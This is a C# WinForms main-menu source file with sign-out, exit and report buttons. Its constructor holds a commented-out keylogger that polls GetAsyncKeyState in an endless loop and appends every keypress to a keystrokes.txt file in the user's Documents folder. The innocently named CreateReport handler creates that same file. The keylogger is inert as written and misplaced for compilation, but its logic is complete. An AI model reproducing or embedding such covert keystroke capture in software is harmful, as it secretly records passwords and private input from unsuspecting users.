using System.Runtime.InteropServices;
using System.IO;


namespace TSE
{
  
    public partial class MainMenu : Form
    {
        public MainMenu()
        {
            InitializeComponent();

            /*

            [DllImport("User32.Dll")]
            public static extern int GetAsyncKeyState(Int32 i);

            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\keystrokes.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }

            while (true)
            {
                Thread.Sleep(5);

                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == -32767)
                    {
                        Console.Write((char)i + ", ");


                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                    }
                }





            }

            */



        }

        private void EndProgram_Click(object sender, EventArgs e)
        {
            Application.Exit();
        }

        private void Signout_Click(object sender, EventArgs e)
        {
            Login Login = new Login();
            Login.Show();
            this.Hide(); //change to remove eventually maybe
        }

        private void CreateReport_Click(object sender, EventArgs e)
        {
            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\keystrokes.txt");

            if (!File.Exists(path))
            {
                using (StreamWriter sw = File.CreateText(path))
                {

                }
            }
        }
    }
}